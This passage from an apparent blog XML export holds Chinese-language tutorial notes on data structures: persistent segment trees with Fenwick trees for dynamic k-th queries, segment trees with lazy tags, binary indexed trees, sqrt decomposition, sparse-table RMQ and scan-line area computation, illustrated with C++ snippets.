前面我们处理的都是静态的第k大值的问题，但是实际应用中我们往往会遇到很多动态的情况。比如操作中包含对某些点的更新，在这种情况下区间的第k大值的话，难度就很大了。前面我们处理区间第k大值的时候，是按照从左到右的顺序逐步插入点的，并且建的是权值线段树，这个时候如果我们要更改第x位的数字的话，那么后面rt[x+1]~rt[n]都要进行更改，这样的代价很明显是不可取的。那么我们就必须换一种思路。这里以洛谷P2617为例 给一个长度为n的序列，以及m个操作，包含两种类型，一种是求[l,r]区间上的第k大值，另一种是修改当前数组中某个元素的值。 对这道题来说，我们要实现的是单点修改和区间查询两种操作。要满足修改操作的话，那么我们又必须对后面的所有数，即区间进行更新。那么我们能不能减少更新的数量呢？仅仅更新一部分主席树即可。像上一篇文章中求前缀和的问题一样，用一个sum数组累计前缀和的话，遇上有单点修改操作的时候，sum数组后面所有数字都要进行修改。当时我们用的是线段树和树状数组解决的。那么对于这个问题，是不是可以采用类似的思路呢？ 结合这道题而言，我们选择采用了树状数组来实现。(理论上也是可以用线段树实现的，但是线段树的复杂度在常数上略输一筹)。注意到，这个时候，每一颗主席树中每一个点代表的是一段前缀和，并且，在更新的时候，只能用自身的信息来更新自身，否则会破坏树状数组的结构。 并且，由于这道题中有单点修改操作，因此在建树的时候我们必须先进行离线操作，将修改的值也放进数组当中并进行离散化处理。 几个核心函数如下：1234567891011121314151617181920212223242526272829303132333435363738void update(int pre, int&amp; now, int l, int r, int v, int type) &#123; now = ++tot; sum[now] = sum[pre] + type; if (l == r) return; lson[now] = lson[pre]; rson[now] = rson[pre]; int mid = mid(l,r); if (v &lt;= mid) update(lson[pre], lson[now], l, mid, v, type); else update(rson[pre], rson[now], mid+1, r, v, type);&#125;// type为1加上，-1表示减去// x表示的是在原数组a中的下标，使用lower_bound得到其在离散化后的数组的位置// 注意到使用树状数组，每次更新点x的时候，还要更新x+lowbit(x)的主席树inline void add(int x, int type) &#123; int pos = lower_bound(b+1, b+m+1, a[x]) - b; while (x &lt;= n) &#123; update(rt[x], rt[x], 1, m, pos, type); x += lowbit(x); &#125;&#125;// 同样的，由于使用树状数组，这里需要加上(减去)所有沿着树状数组路径上的主席树int query(int l, int r, int k) &#123; if (l == r) return l; int x = 0; for (int i = 1; i &lt;= tl; i++) x -= sum[lson[ql[i]]]; for (int i = 1; i &lt;= tr; i++) x += sum[lson[qr[i]]]; int mid = mid(l,r); if (k &lt;= x) &#123; for (int i = 1; i &lt;= tl; i++) ql[i] = lson[ql[i]]; for (int i = 1; i &lt;= tr; i++) qr[i] = lson[qr[i]]; return query(l, mid, k); &#125; else &#123; for (int i = 1; i &lt;= tl; i++) ql[i] = rson[ql[i]]; for (int i = 1; i &lt;= tr; i++) qr[i] = rson[qr[i]]; return query(mid+1, r, k - x); &#125;&#125;// 如果需要整个题目的代码的话，也可以联系我哈(其实网上好多题解的) 这种写法的话，时间和空间上复杂度均为O(nlog2n)，开销是很大的。但貌似没有什么更好的办法了。(如果有还请告诉我) last but not least 重新回到我们的主题上面来，我们一开始提的问题是，求解一个区间上的第K大值的问题，当然，上面讨论的使用主席树的写法其实主要是用于多次询问，如果只有一次询问的话，很显然我们完全没必要这么麻烦。我们可以直接使用sort，然后输出第k个数即可。我们也可以使用选择排序，第k个选择的数就是第k大。我们甚至可以使用哈希进行计数排序。貌似也可以使用堆排序进行处理。当然，还有一种使用基于快速排序思想的求第k大的算法。 这里想说的其实是，对于一道同样的问题，它的解法有可能是多样化的，并且，对于不同的数据规模，可能也有不同的优秀算法，因此，最好不要拘泥于某一中特定的算法(当然，解法唯一的题目还是有的吧)。 (包括很多看起来很难的题目，由于数据比较水，暴力还是可以拿到很多分的，甚至AC epilogue 数据结构大杂烩系列的第二篇文章在这里就告一段落了(其实这篇文章严格意义上来说应该算是第一篇文章的补充)。同样的，我们一开始引入一个区间第k大的问题，然后，顺着这个话题，讲到了权值线段树的一些概念，一步一步推出主席树建立的思想过程，接着，再通过一道模板题，简单地提了一下主席树的写法。再接着，我们又将题目难度升级，尝试着求解树上的第k大问题，再后面，我们又提到了带单点修改的主席树的写法(其实严格意义上说这个应该算是树套树)。最后，我们再一次地回到了主题，关于求解区间的第k大的问题。当然，如果要理解清楚的话，还是只能自己去做几道题，这里目的仅仅是提一下主席树的思想而已。 下一篇文章的话可能要比较久后才出来，也有可能写算法相关的一些博客，敬请期待吧。(在做了.jpg]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>Data Structure</tag>
        <tag>persistent segment tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Data Structure Note(I) —— segment tree]]></title>
    <url>%2F2019%2F05%2F14%2Fdata-structure1%2F</url>
    <content type="text"><![CDATA[prologue 这是数据结构大杂烩系列的第一篇文章。这个系列主要将记录自己在学习数据结构方面的一些笔记等，以加深自己对数据结构的认识。(不知道能不能坚持做下去 在维基百科中，是这样介绍数据结构的： In computer science, a data structure is a data organization, management, and storage format that enables efficient access and modification. More precisely, a data structure is a collection of data values, the relationships among them, and the functions or operations that can be applied to the data. 数据结构作为计算机中一个不可分割的重要组成部分，应用十分广泛，几乎在绝大多数的代码中我们都能见到它的身影——链表，栈，队列，树等等。下面就让我们一起来学习一些基础的数据结构吧！ 今天的主题是segment tree，也就是线段树！ a simple problem 在正式学习线段树相关的问题之前，我们先来考虑以下一个问题。 给定一个数组n，然后有m个询问，每个询问包含两个值L和R，我们需要求出在区间[L，R]内所有的元素的和(乘积)。 最直接的，我们知道，可以直接起手一个for循环，直接遍历累加即可。好吧，那么这个时候如果n的大小为200000，且有m个询问，复杂度可是O(nm)了，这样的复杂度还能接受吗？作为一个软件工程师，我们当然是不能接受的。那么怎么办呢？ 这时候你可能要认为，那就用线段树吧，今天的主题。但是，我拒绝！ 就这个问题来说，我们不需要使用什么数据结构，只需要开一个新的sum数组，对前缀和做一个累加(累乘，不考虑溢出)，然后，我们只需要用sum[R]-sum[L-1]即可得到区间[L,R]的累加值了。 这个时候，又来了一个问题，现在我需要修改某一个点x了，这该怎么办呢？直接更新sum[1]~sum[x-1]显然是不行的，这样的效率也太低了，这种方法就做不下去了。这样，我们就引入了一种新的数据结构，叫线段树。 what is a segment tree 从名字我们其实就可以猜到它是干什么的。线段树首先是一颗树，而且还是一棵完全二叉树(此处不予证明)。并且，每一个叶子结点的值包含着某一个线段(区间)的一些信息。这就是线段树。这么说可能还有点难以理解，下面我们以一个长度为7的数组[3,4,1,6,7,5,2]为例子，来看下一颗线段树长什么样子。 这就是一颗简单的线段树。每个节点包含的区间长度大于1时，则会分裂出子节点，直到长度为1。其中，左儿子为包含的为左半区间，右儿子包含的为右半区间，并且，同一层之间所有节点包含的区间的并集为恰好为整个区间(满二叉树下)，且各节点包含的区间之间没有任何重叠。 123456struct seg_node &#123; int l, r; // 该节点包含的区间为区间[l,r] int sum; // 区间的和 int maxn, minn; // 区间的最大值和最小值 ...&#125; tree[N]; how to build a segment tree 构建一颗线段树的话，简单来说就两个字，二分！对于每一个区间[L,R]，当R！=L时，就分裂出子节点，分界为mid。这样，我们就得到了一颗用于求区间和的二叉树。注意到线段树的特性使得对下标为n的节点，左儿子的下标为2n，右儿子的下标为2n+1123456789101112131415#define lson(d) (d&lt;&lt;1)#define rson(d) (d&lt;&lt;1|1)int a[8] = [0,3,4,1,6,7,5,2]; // 数组下标是从0开始的，这里为了方便补一个0void build(int d, int l, int r) &#123; tree[d].l = l; tree[d].r = r; if (l == r) &#123; // 叶子节点时结束递归。并且赋值 tree[d].sum = a[l]; return; &#125; int mid = (l+r)&gt;&gt;1; build(lson(d),l,mid); build(rson(d),mid+1,r); tree[d].sum = tree[lson(d)].sum + tree[rson(d)].sum; // 别忘了递归完后要进行值的合并&#125; segment tree’s operationsearch one leaf 如果我们需要查找某一个节点,我们可以这样来写(其实就是一个二分查找)：1234567void search(int d, int x) &#123; int l = tree[d].l, r = tree[d].r; if (l == r) return tree[d].x; int mid = (l+r)&gt;&gt;1; if (x &lt;= mid) return search(lson(d),x); else return search(rson(d),x);&#125; 看到这里，我想也许你会有一个疑问，这样写的话，查找单个点的复杂度不就变成了O(logn)了吗？这效率不是变低了吗？是的，查找一个点的话，效率确实变低了。然而，线段树最大的优势在于区间上！ query 接下来这里就是重头戏了，在查找一个区间的时候，我们这样来写：123456789101112// 查询[L,R]区间和int query(int d, int L, int R) &#123; int l = tree[d].l, r = tree[d].r; if (L &lt;= l &amp;&amp; r &lt;= R) &#123; return tree[d].sum; // 当所查找的区间完全覆盖当前节点时，直接返回！ &#125; int mid = (l+r)&gt;&gt;1; int ans = 0; if (L &lt;= mid) ans += query(lson(d),L,R); // 查找的区间覆盖到左区间时，往左找 if (R &gt; mid) ans += query(rson(d),L,R); // 查找的区间覆盖到右区间时，往右找 return ans;&#125; 下面还是以那个数组为例，看一下查找区间[3,5]的时候会发生些什么(红色的线为查询过程中经过的路径)。 同样的，区间查找也可以用于维护区间的乘积以及最大值和最小值。 可以证明，线段树的区间查询复杂度为O(logn)，简单的证明如下： 由前面我们知道，含n个元素的线段树最多为logn+1层。目标证明每一层需要考察的节点数不会超过4个。 假设现在在[l,r]区间内查询[L,R]。在当前层内，考察的节点数为2(左右儿子)。当[L,R]仅覆盖左子区间或右子区间时，递归进入对应区间，下一层考察的节点数仍为2，回到证明2。当同时覆盖左子区间和右子区间时，下一层考察的节点数为4，进入证明3。 将左子区间的左右儿子记为左1和左2，右子区间的左右儿子记为右1和右2。由于区间的连续性和不相交性，查询区间必定覆盖左2和右1，若该区间没有覆盖左1和右2，则下一层需要考察的节点仍然为4个。若区间覆盖了左1，则必然覆盖了左2整个区间，左2不再递归；若区间覆盖了右2，则必然覆盖了右1整个区间，右1不再递归，则下一层需要考察的节点仍然不超过4个。 另外一种大致的证明思路是，把当前查询区间[L,R]分为n个子区间，且每一个子区间的长度都是2的整数次幂，即N = 2k0+2k1+…+2kn。且不存在连续的3个k的值相同(若存在，由区间的连续性，则有其中的两个k可以并成一个更大k，矛盾)，故n&lt;=2logN。并且，k的值只能先减小后增大，不会出现两次减小的情况。此时，可以得到每一层需要获取sum的节点数必为常数，最后的时间复杂度级别仍然为O(logn)。 change one leaf 尽管前面我们已经能够求得在logn的复杂度情况下求得区间和了，但如果需要修改的话，线段树做的到吗？答案显而易见。当要更改某一个节点时，只需要按照逐层深入，修改某个节点即可,记得修改完后更新父亲节点的值即可。1234567891011void update(int d, int pos, int v) &#123; int l = tree[d].l, r = tree[d].r; if (l == r) &#123; tree[d].sum = v; return; &#125; int mid = (l+r)&gt;&gt;1; if (pos &lt;= mid) update(lson(d), pos, v); else update(rson(d), pos, v); tree[d].sum = tree[lson(d)].sum + tree[rson(d)].sum;&#125; lazy tag 既然前面我们考虑到了改变某个节点，现在如果要更新某个区间呢？线段树又该怎么处理呢？ 最直接的办法就是逐点更新，这样的处理明显是不行的，但是如果要一次性更新那么多个节点，别说复杂度高达O(mn)，栈也很有可能会爆掉。那么我们有什么好办法呢？ 注意到一个细节，我们是不是可以不用更新那么多个节点呢？如果只更新少量节点的话，复杂度就可以下降了吧？比如现在在维护一个区间和，然后当前区间为[3,4]，要更新的区间为[2,4]，那么我们是不是可以只要更新节点[3,4]就行了，它的子节点暂时不去管，这样，如果需要查询区间[3,4]，我们也能给出正确的答案，只有当需要请求到[3,3]节点的时候我们再去更新它。如下图： 核心代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041struct segment_tree &#123; int l, r; long long v, tag; // tag为惰性标记，v为区间和&#125; tree[N];/* pushdown为线段树的关键操作，作用是将惰性标记从父节点传递到子节点。注意一下，当打上标记tag的时候，说明当前节点的更新已经完成，但是子节点的值还没有更新。传递的时候就更新子节点，然后子节点打上标记(子节点的子节点待更新)，并且把当前节点的标记清零，说明子节点的更新已经完成。*/void pushdown(int d) &#123; int l = tree[d].l, r = tree[d].r; int tag = tree[d].tag, mid = (l+r)&gt;&gt;1; tree[d].tag = 0; tree[lson(d)].v += (mid - l + 1) * tag; tree[rson(d)].v += (r - mid) * tag; tree[lson(d)].tag += tag; tree[rson(d)].tag += tag;&#125;void update(int d, int L, int R, int v) &#123; int l = tree[d].l, r = tree[d].r; if (L &lt;= l &amp;&amp; r &lt;= R) &#123; tree[d].tag += v; tree[d].v += (long long) v * (r - l + 1); return; &#125; if (tree[d].tag) pushdown(d); // 注意，这行代码不能漏掉，否则会导致当前节点得到的值不是真实值 int mid = (l+r)&gt;&gt;1; if (L &lt;= mid) update(lson(d), L, R, v); if (R &gt; mid) update(rson(d), L, R, v); tree[d].v = tree[lson(d)].v + tree[rson(d)].v;&#125;long long query(int d, int L, int R) &#123; int l = tree[d].l, r = tree[d].r; if (L &lt;= l &amp;&amp; r &lt;= R) return tree[d].v; if (tree[d].tag) pushdown(d); // 注意，当想要查询子区间时，需要先进行更新！ int mid = (l+r)&gt;&gt;1; if (R &lt;= mid) return query(lson(d), L, R); else if (L &gt; mid) return query(rson(d), L, R); else return query(lson(d), L, R) + query(rson(d), L, R);&#125; 线段树一个比较大的难点就在于惰性标记的设置上，一不小心很容易犯错，且通常情况下这种错误很难肉眼直接看出来(笔者就曾经因为惰性标记卡了好久)。这个还是建议做一下题，基本上就可以很好地掌握了。推荐codevs上面的线段树系列。 double lazy tag 好了，如果到这里你都能看懂的话，现在难度又要提高了。如果我们的区间更新中，既包括加法，又包括乘法，那该怎么办呢？这样的话，上面的lazy tag做法似乎就存在一些问题了。 一个可行的解法是，如果一个lazy tag不行，那就来两个！这样貌似没什么问题，可细细想想，问题老多了。首先，如果有两个tag，一个表示加法，一个表示乘法，那么在传递的时候，我们应该先将哪一个传递下去呢？比如这个时候如果我们对整个区间做了一个加法，又做了一个乘法，再做了一个加法，那这样的话不久乱套了吗？ 为了顺利解决不同的tag之间的冲突，我们必须为tag定一个先后顺序。 让我们先来考虑这样的情况。假设当前区间的和为x，共n个元素，现在依次做一个区间加法a，一个区间乘法b，再来一个区间加法c。 如果我们先把加法传递下去。那么第一步打上加法标记a，接下来做区间乘法，打上乘法标记b，再做区间加法，加法标记变为a+c。这个时候进行一次pushdown操作，由于加法优先，子节点(和为x,元素数量为n)从x变为b(x+(a+c)*n)，显然是不对的。如果要使最后的答案变得正确，我们需要把c修正为c/b。这就带来了很多麻烦了。 如果我们先把乘法传递下去。一开始打上加法标记a，后面在打上乘法标记b的时候，把加法标记变成ab，最后加上c的时候，加法标记变为ab+c(注意到b*(x+a)+c = bx+ab+c)。即我们需要做的，就是在处理区间做乘法的时候，同时对加法标记做一次乘法，在处理区间做加法的时候，只需要更新加法标记即可。核心代码如下：12345678910111213141516171819202122232425262728struct seg_tree &#123; int l, r; long long v, add_tag, mul_tag;&#125; tree[N];void pushdown(int d) &#123; int l = tree[d].l, r = tree[d].r; int lson = lson(d), rson = rson(d); int mid = (l+r)&gt;&gt;1; if (tree[d].mul_tag != 1) &#123; long long v = tree[d].mul_tag; // 下面取模是题目需要，如果题目保证不溢出，则可省去 tree[lson].add_tag = (tree[lson].add_tag * v) % mod; tree[rson].add_tag = (tree[rson].add_tag * v) % mod; tree[lson].mul_tag = (tree[lson].mul_tag * v) % mod; tree[rson].mul_tag = (tree[rson].mul_tag * v) % mod; tree[lson].v = (tree[lson].v * v) % mod; tree[rson].v = (tree[rson].v * v) % mod; tree[d].mul_tag = 1; // 注意到乘法标记的初始值应该为1，即乘法运算的单位元 &#125; if (tree[d].add_tag) &#123; long long v = tree[d].add_tag; tree[lson].add_tag = (tree[lson].add_tag + v) % mod; tree[rson].add_tag = (tree[rson].add_tag + v) % mod; tree[lson].v = ((mid - l + 1) * v + tree[lson].v) % mod; tree[rson].v = ((r - mid) * v + tree[rson].v) % mod; tree[d].add_tag = 0; &#125;&#125; 当然，如果现在题目不是要求同时做加法和乘法，而是进行set操作(将区间所有值变为一个确定的值，见codevs的线段树练习题)，那么我们的策略也要进行对应的更改，这里不再赘述。另外，说一个题外话，如果有三个或以上的区间操作呢？大体的思路还是一样的，即在保证各个tag不相互冲突的前提下将tag传递到子节点即可。相信聪明的你一定能找到对应的解决办法的。 Binary Indexed Tree 前面我们谈到了用线段树去实现区间的修改和查询。但是除去线段树的话，还有没有什么比较好的办法呢？答案肯定是有的，它的名字叫做树状数组。不过，与其说是树状数组，它的英文名字更能体现出它的思想。树状数组的每一个位置存放的是一个区间的值，而不是一个点，其直观表现图如下： prepare 要实现树状数组，首先，必须要理解lowbit函数，具体如下：123int lowbit(int x) &#123; return x&amp;-x;&#125; 尽管只有短短一行代码，理解起来还是有一定难度的。这个函数的作用是取得二进制下x的最小的1所在的位置对应的值。这样说起来有点绕口。举个例子，x=10100100(2)，这个时候x最右的一个1在第三位，对应的值为100(2)。我们可以验证一下，-x = 01011100(2)，x&amp;-x = 100。具体证明此处省略。 在理解了lowbit函数后，我们就可以观察上面的图，我们可以看出，每一个点保存的其实就是(x-lowbit(x),x]区间的数字的和。 query 理解好了树状数组的结构后，我们来看一下应该怎样对区间进行求和。首先，我们给定x，我们考虑如何求[1,x]区间上所有数字的和。代码很简单，见下：12345678910#define lowbit(x) (x&amp;-x)// sum[i]为树状数组int query(int x) &#123; int ans = 0; while(x) &#123; ans += sum[x]; x -= lowbit(x); &#125; return ans;&#125; 为什么上面的代码能起作用呢？如果当前我们要查找[1,7]的区间和，那么，由上面的函数，我们可以得到ans = sum[7] + sum[6] + sum[4]。不难看出，对于[1,x]的区间求和的问题，我们可以划分为[1,x-lowbit(x)]和[x-lowbit(x)+1,x]的和两个子问题，而由树状数组的结构，我们有[x-lowbit(x)+1,x]的区间和为sum(x)，这个时候，整个问题就变成只需要求[1, x-lowbit(x)]的值的问题了。这样不断递归下去，最终，当x是2的整数次幂的时候，sum[x]表示的恰好就是[1,x]的值，函数退出，我们成功地求出了前缀和！ 当我们能求出前缀和的时候，剩下的问题就很简单了。当我们需要求[l,r]的值的时候，我们只需要求query(r)-query(l-1)的值即可。 update 我们先来考虑更新一个点的情况。要更新一个点，我们需要同时更新其“父”节点，对于树状数组而言，该节点对应的下标为x+lowbit(x)。由此，我们可以得到以下的函数：12345678// n 为数组元素的个数// 注意，对于这种结构的树状数组来说，把点d从a变成b的时候，我们的更新是相当于加了一个差值，即update(d, b-a)void update(int x, int v) &#123; while (x &lt;= n) &#123; sum[x] += v; x += lowbit(x); &#125;&#125; 那么，接下来我们考虑该如何进行区间的更新呢？ … … 惊了！我们发现，按照我们目前的思路，除了单个点逐步暴力地更新之外，我们发现竟然没有别的什么好办法。那怎么办？这个博客就不写了吗？ 不，我还是拒绝！ 其实，想要进行区间的更新还是有办法的，但是我们的数组存放的“东西”得改一改了(见codevs中线段树练习2)。 这里简单的讲一下这道题的意思，就是n个数，m个操作，其中，共有两种操作类型，其一是进行区间的更新(加上某个值)，其二是进行单点的查询。在这样的一个背景下，我们可以使用线段树来完成这个要求。 具体来说，对于原先的数组a[N]，我们新建一个数组sum[N]，并且，sum[N]是一个树状数组，保存的是相对与初始值的变化量，初始为空。接下来，更新的操作比较神奇。假设我们要在区间[l,r]上，每个数都加上n。我们知道，下标为x的数字，当且仅当l&lt;=x&lt;=r时，即在区间内时，这个数字需要加上n。这个时候，我们就可以在下标为l的地方加上标记n，在下标为r+1的地方打上标记-n，这样，在单点查询下标为x的位置的值的时候，我们的问题就可以转化为一个区间求值的问题了。如果还是不太理解，请看下图： advantage &amp; limitation 由上面的介绍，我们其实可以看得出来，树状数组虽然理解起来稍微困难一些，但是代码量是很小的，而且也很难出现一些隐蔽的bug，这对与经常写出bug的程序猿(比如笔者)来说，还是很友好的。并且，时间上，树状数组进行区间查询和单点修改的操作的复杂度为O(logn)，且常数极小，因此在树状数组适用的情景下，其效率是线段树的好几倍(线段树由于存在函数的递归，以及lazy tag的pushdown操作，常数是很大的)。空间上，树状数组通常不需要额外的存储空间，其空间复杂度为O(n)，而线段树通常需要2n~4n的空间，这使得线段树显得过于“笨重”。 但是，树状数组的特性也决定了它具有很大的局限性——由上面我们知道，树状数组比较适合用来做区间的查询和单点的更新数量较多的操作，但是无法进行区间的修改。尽管后面的版本我们通过记录区间边界使得树状数组可以进行区间的修改，但同时，无法进行区间的查询，这是相对的。因此，尽管树状数组确实很好用，但应用范围比较狭窄。可以说，树状数组可以实现的东西，线段树都可以实现，然而线段树可以实现的东西，很多情况下树状数组却实现不了。当然，在能用树状数组实现的情形下，还是推荐用树状数组好。 另外，关于树状数组和线段树的使用情形，看过一句话说得挺精辟的。在离散数学的观点下，线段树适用于含幺半群(即满足结合律，且有单位元)，而树状数组仅适用于交换群(必须满足结合律，交换律，且含有单位元，以及每个元素均存在逆元)。故树状数组适用范围更小一些。 block(?) algorithm 也许上面提供的两种区间的结构化查询你都不够满意，现在，还有一种十分暴力的写法，它的名字叫做”分块”。这种做法就是完全暴力的进行处理，它能处理基本上所有线段树能处理的问题，并且，对于线段树处理不了的某些问题，它竟然也能够处理！那么，我们就来看一看分块是什么吧。 现在，我们来考虑下这个问题(codevs的线段树练习4加强版)： 给一个序列，含有n个元素(1&lt;=n&lt;=200000)，要求实现m个操作，共两种类型，第一种是区间每一个数都加上n，第二种是查询区间内有多少个数是k的倍数。其中，1&lt;=k&lt;=200000，1&lt;=m&lt;=200000 看到k的取值范围这么大，瞬间慌了，这不就是不想让我用线段树吗？每个节点保存20w个数字，怎么可能？因此，忍无可忍的情况下，我们决定暴力做了。 首先，很明显如果我们要直接便利的话，复杂度还是太高了，最坏情况下达到O(mn)，这不行。那么，我们能否参考一下使用线段树的思路呢？具体来说，我们也可以考虑一下将区间分成一个个的小块，然后，维护每一个块上值为1~200000的倍数的数字的数量，这样就可以解决了！ 以n=200000，1&lt;=k&lt;=200000为例，我们取每一个块的大小为500，那么总共就有400个块，每一个块上维护的话需要400*200000大小的数组。这已经很极限了。当我们需要将区间[l,r]值增加n的时候，按照一下步骤： l和r在同一个块里面的时候，则r-l&lt;500，我们直接暴力for循环增加即可。 当l和r不在同一个块的时候，不妨假设l所在的块为x1&lt;=l&lt;=x2，r所在的块的范围为x3&lt;=r&lt;=x4，则我们需要for循环更新位于[l,x2]和[x3,r]的所有点的值，并且，将位于x2和x3之间的所有块全部加上标记n即可。这样的话，最坏情况下，复杂度也是近似于O(sqrt(n))。 同样的，在进行区间内查询的时候，假设查询[l,r]区间内k的倍数的个数，按照以下步骤： l和r在同一个块里面，直接暴力求解 l和r不在同一个块里面，则同样假设l所在的块为x1&lt;=l&lt;=x2，r所在的块的范围为x3&lt;=r&lt;=x4。则我们只需要for循环遍历位于[l,x2]和[x3,r]的所有点，看下该值加上当前块的标记值结果是否是k的倍数即可复杂度为O(sqrt(n))。对于位于[x2,x3]内所有的块，假设当前的块标记值为c，则我们只需要查看数组中(k-c)的值即可，复杂度同样为O(sqrt(n))。 本质上，这样的分块算法其实相当于一颗高度为3的树，其中，每个非叶子节点的孩子的个数近似为sqrt(n)个。整个问题而言，最后的总复杂度为O(m*sqrt(n))。 当然，这道题本身应该有比较优秀的做法，这里只是提一下分块这样的一种思想，在处理一些十分棘手的问题，并且实在想不出什么好的问题的时候，不妨试一试吧。这里顺便说一句题外话，如果是静态的序列，想多次查找某个值是否是k的倍数的话，有一个叫做莫队算法的神奇的东西(好像就是一位叫莫涛的选手发明的)，本质上也是用到了分块的思想。 Range minimum query (RMQ) 前面我们提到，树状数组无法实现对于区间的求最值问题，是因为max和min运算不存在逆元。现在，如果我们想求区间的最大值最小值，但又觉得线段树太慢，有没有什么能像树状数组一样快的东西呢？结论是有的！(当然，这种算法不适用于动态更新的序列 detail ST-RMQ算法本质上应该算是动态规划类，它的优秀之处在于，对于一个给定的序列，它只需要O(nlogn)的复杂度进行初始化，此后，能以O(1)的复杂度解决区间最值的求解问题。在一个2^n长度的数组中，对于一个坐标为x的点，我们可以保存以其为起点，且区间长度为2k的区间的最值。在动态规划的思想中，我们使用F[Bit][Pos]来表示起点位于Pos，且长度为2Bit的区间的最值。这个时候，求解的状态转移方程如下： F[bit][p] = max(F[bit-1][p], F[bit-1][p+(1&lt;&lt;(bit-1))]); 即对于长度为b = 2bit的区间来说，该区间的最大值等于两个子区间中最大值更大的那一个。当然，也许你会问，如果仅仅能得到长度为2的幂次的区间的最值，那有什么用？通常情况下，我们遇到的区间的大小都不会是2的幂次。这里有一个比较巧妙的操作。令len是小于等于区间长度的最大的2的幂次，则整个区间的最大值为max(F[bit][l],F[bit][r-len+1]) 核心代码如下：12345678910111213// 初始化操作// max_bit 表示小于等于区间长度的最大的2的幂，下面的bit同理for (int i = 1; i &lt;= max_bit; i++)for (int j = 1; j &lt;= n; j++) &#123; if (j + (1&lt;&lt;i) - 1 &gt; n) break; // 超过区间的右侧时退出 int len = 1&lt;&lt;(i-1); F[i][j] = max(F[i-1][j], F[i-1][j+len]); // 状态转移方程 printf("F[%d][%d]=%d\n", i, j, F[i][j]);&#125;// 获取区间[l,r]上的最大值bit = getLen(r-l+1);printf("%d\n", max(F[bit][l], F[bit][r-(1&lt;&lt;bit)+1])) application of setment segment tree 前面我们一开始谈到了，线段树是很厉害的，很多事情都可以做。然而，后面我们又枚举了一大堆在比较特殊的情况下，效率比线段树更优的结构，这不是明显打脸吗？现在，我们来看一下线段树究竟可以干一些什么其他的一些结构做不了的事情吧。 discretization 为了讲接下来的一个例子，我们需要先提到一个概念——离散化。这是一个很神奇的词汇，它可以将一些看似十分困难的题目转化为一些简单的情形。尽管举的例子不太恰当，但我们还是来看一下下面的一种情形吧。 通常情况下，我们建线段树的时候是以数组的下标为叶子节点建立的，比如数组有n个元素，则线段树的叶子节点数量为n。假设我们现在要以值的大小为节点建一个线段树，比如值域为[1,200000]，则线段树有20w个叶子节点，但是，如果值域变为了[1,20000000]，然后元素的个数仅有10000个，这个时候，我们总不可能建一个叶子节点数为20000000的线段树吧。这个时候，我们就需要用到离散化的思想了。 离散化思想的本质是，将一个无限大小(或特别大)的空间映射到一个较小的空间。比如下面的函数就类似于一个离散化的过程： 再回来考虑我们前面建立线段树的过程，由于只有10000个节点，而值域为[1,20000000]，我们知道各个节点的值的分布是十分“松散”的。这个时候我们就可以使用离散化，具体步骤是将10000个节点按照大小排序，假设排序后的数组为a0,a1…an，这个时候我们取一个映射：a0-&gt;1,a2-&gt;2…an-&gt;n，这样的话，我们就成功地将一个值域为[1,20000000]的离散区域映射到一个[1,10000]的分布较为紧密的区域当中了，这就是离散化。 scan line algorithm 这里要介绍的，就是大名鼎鼎的扫描线算法……..的简单版。这就是一个很典型的线段树的应用问题。 由于这个笔记的篇幅有点长，这里就不再贴代码了。主要讲一讲相关的思路。为了引入扫描线算法，我们先来看下扫描线算法的一道裸题。 给定一个平面上的n个矩形，求n个矩形的并覆盖到的面积的大小 扫描线算法的核心思想在于“扫描”两字，即用一条“扫描线”遍历一整个平面区域。这里，我们假设扫描线与x轴垂直。由于x是递增的，这个时候我们将每一个矩形的两个y轴坐标扔进数组中，进行排序并离散化，映射到一个值域为2n的数组(每一个矩形有两个y坐标)当中，得到2n-1条边，经过去重后，以各条边为叶子节点建立线段树，维护区间的覆盖问题。(其实，关于这里y轴的维护具体实现办法有很多种，比如也可以以每一个y坐标为叶子结点，但实现起来很麻烦，最后还是归结到边的覆盖问题) 接下来，具体的做法是： 将扫描线从最左侧开始扫描，在第一次与矩形的边界重合的时候停下。 如果遇到的是左边界，则说明该区间被覆盖。如果遇到的是右边界，则说明该区间不再被对应的某个矩形覆盖。并且更新线段树。 继续往右扫描，直到遇到边界，假设此时前进了deltaX，则当前答案加上deltaX乘上线段树中区间覆盖的面积，再进入2。直到到达最后一条边，结束循环。 如果还是不太理解，建议结合下面的图看一下。其中，红色为扫描线，深蓝色表示该边当前已覆盖，浅蓝色表示该边已覆盖。 这就是实现一个扫描线算法的简单思路，当然，具体实现过程中会有许许多多的小细节，各种边界问题什么的需要处理，难度还是比较大的。这里就不再进行叙述了。(毕竟这是数据结构的笔记，这里提到这个算法主要还是想提一下线段树的应用） epilogue 到这里，我们的数据结构大杂烩系列的第一篇文章就结束了。这里总结一下这篇文章讲的内容吧。首先，由一个简单的问题，我们引入了线段树，并且，讲到了线段树是如何构建的，并且，它是如何实现单点/区间的更新和单点/区间的求和(乘积)，以及线段树的lazy tag思想。在此上拓展开来，我们又简单地提到了树状数组及其应用，这是一种效率很高但同时受限又很大的数据结构，并且我们比较了线段树和树状数组的特点。接下来，我们又讲到了分块算法，在不得已的情况下，我们可能只能采用分块来对区间进行维护，这是一种“暴力”解法的优化版本。接下来，从树状数组的弊端，我们又讲到了在线RMQ算法，这是一种用于多次求解一个固定序列的区间最值的算法，利用到了动态规划的思想。最后，再次回归到了主线，讲线段树的应用问题——扫描线算法，文章也到此结束。 由于是刚开始这个系列，感觉写起来还是很乱的，基本上是想到什么写什么，并且，详略上可能也存在一些小问题。这篇文章总共用了一天多的时间，大概是从早上十点多写到晚上十点多吧，第二天也花了好几个小时做一点修改。东西挺多，并且个人感觉也已经挺全面了，不过很多东西仅仅简单提及。当然，本身就不可能做到全面，但还是希望能继续加油吧。 预告——下一期应该还是会写和树相关的一些结构，敬请期待吧。]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>Data Structure</tag>
        <tag>segment tree</tag>
        <tag>binary indexed tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Network——Transport_layer]]></title>
    <url>%2F2019%2F03%2F27%2FNetwork%E2%80%94%E2%80%94Transport-layer%2F</url>
